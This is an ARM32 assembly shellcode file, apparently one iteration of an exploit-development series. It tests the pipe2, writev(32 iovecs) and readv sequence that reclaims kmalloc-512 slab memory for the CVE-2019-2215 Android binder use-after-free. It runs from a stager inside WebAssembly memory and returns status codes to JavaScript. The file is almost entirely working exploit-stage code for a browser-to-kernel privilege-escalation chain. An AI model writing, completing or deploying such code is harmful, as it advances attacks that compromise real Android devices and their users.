/*
 * pipe_iovec_test.s — Test pipe2 + writev(32 iovecs) + readv
 * ARM32 EABI shellcode
 *
 * v19: Tests the exact syscall pattern needed for CVE-2019-2215 iovec reclaim.
 * writev with 32 compat iovecs triggers kernel kmalloc(512) for native iovec
 * array — the same slab (kmalloc-512) as freed binder_thread.
 *
 * Sequence:
 *   A1: pipe2(pipe_fds, 0) → pipe[0], pipe[1]
 *   A2: Fill 32 compat iovecs at wasm_mem+0x1000 (each: base=0x1200, len=1)
 *   A3: writev(pipe[1], iovecs, 32) → write 32 bytes to pipe
 *   A4: readv(pipe[0], read_iov, 1) → read 32 bytes back
 *   A5: close both pipe fds
 *   Return 0xEE00 | bytes_read
 *
 * Return values:
 *   0xEE00-EEFF = success, low byte = bytes read (expect 32 = 0x20)
 *   0xE1xx = pipe2 failed (SECCOMP blocked?)
 *   0xE3xx = writev failed
 *   0xE5xx = readv failed
 *
 * WASM memory layout:
 *   +0x1000: 32 compat iovecs (32 × 8 = 256 bytes)
 *   +0x1100: read iovec (8 bytes)
 *   +0x1200: write data buffer (1 byte: 0x42)
 *   +0x1300: read data buffer (32 bytes)
 *   +0x1400: results (bytes_written, bytes_read)
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

.equ FRAME, 16

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME
    mov     r10, r4             /* R10 = wasm_mem base from stager */

    /* ═══ A1: pipe2(pipe_fds, 0) ═══ */
    add     r0, sp, #0          /* pipe_fds at SP+0 */
    mov     r1, #0              /* flags = 0 */
    mov     r7, #0x160
    add     r7, r7, #7          /* 359 = __NR_pipe2 */
    svc     #0
    cmp     r0, #0
    bmi     fail_e1
    ldr     r5, [sp, #0]        /* R5 = pipe[0] (read end) */
    ldr     r6, [sp, #4]        /* R6 = pipe[1] (write end) */

    /* ═══ A2: Set up 32 compat iovecs + write buffer ═══ */
    /* Write test byte 0x42 at wasm_mem+0x1200 */
    add     r0, r10, #0x1200
    mov     r1, #0x42           /* 'B' */
    strb    r1, [r0]

    /* Fill 32 compat iovecs at wasm_mem+0x1000
     * Each: {iov_base = wasm_mem+0x1200, iov_len = 1} */
    add     r0, r10, #0x1000    /* iovec array start */
    add     r1, r10, #0x1200    /* data pointer */
    mov     r2, #1              /* iov_len = 1 */
    mov     r3, #32             /* count */
iov_setup:
    str     r1, [r0], #4        /* iov_base, post-increment */
    str     r2, [r0], #4        /* iov_len, post-increment */
    subs    r3, r3, #1
    bgt     iov_setup

    /* ═══ A3: writev(pipe[1], iovecs, 32) ═══ */
    mov     r0, r6              /* pipe[1] */
    add     r1, r10, #0x1000    /* iovecs */
    mov     r2, #32             /* iovcnt = 32 → kmalloc(512) in kernel! */
    mov     r7, #146            /* __NR_writev */
    svc     #0
    cmp     r0, #0
    ble     fail_e3
    mov     r8, r0              /* R8 = bytes_written */

    /* ═══ A4: readv(pipe[0], read_iov, 1) ═══ */
    /* Set up read iovec at wasm_mem+0x1100 */
    add     r0, r10, #0x1100
    add     r1, r10, #0x1300    /* read buffer */
    str     r1, [r0, #0]        /* iov_base */
    mov     r1, #32
    str     r1, [r0, #4]        /* iov_len = 32 */

    mov     r0, r5              /* pipe[0] */
    add     r1, r10, #0x1100    /* read iovec */
    mov     r2, #1              /* iovcnt = 1 */
    mov     r7, #145            /* __NR_readv */
    svc     #0
    cmp     r0, #0
    ble     fail_e5
    mov     r9, r0              /* R9 = bytes_read */

    /* ═══ A5: close pipe fds ═══ */
    mov     r0, r5
    mov     r7, #6              /* __NR_close */
    svc     #0
    mov     r0, r6
    mov     r7, #6
    svc     #0

    /* Store results in WASM memory for JS to read */
    add     r0, r10, #0x1400
    str     r8, [r0, #0]        /* bytes_written */
    str     r9, [r0, #4]        /* bytes_read */

    /* Return 0xEE00 | min(bytes_read, 255) */
    cmp     r9, #255
    movgt   r9, #255
    mov     r0, #0xEE00
    orr     r0, r0, r9
    b       done

fail_e1:
    rsb     r0, r0, #0
    mov     r1, #0xE100
    orr     r0, r0, r1
    b       done
fail_e3:
    rsb     r0, r0, #0
    mov     r1, #0xE300
    orr     r0, r0, r1
    b       done
fail_e5:
    rsb     r0, r0, #0
    mov     r1, #0xE500
    orr     r0, r0, r1
    b       done

done:
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}
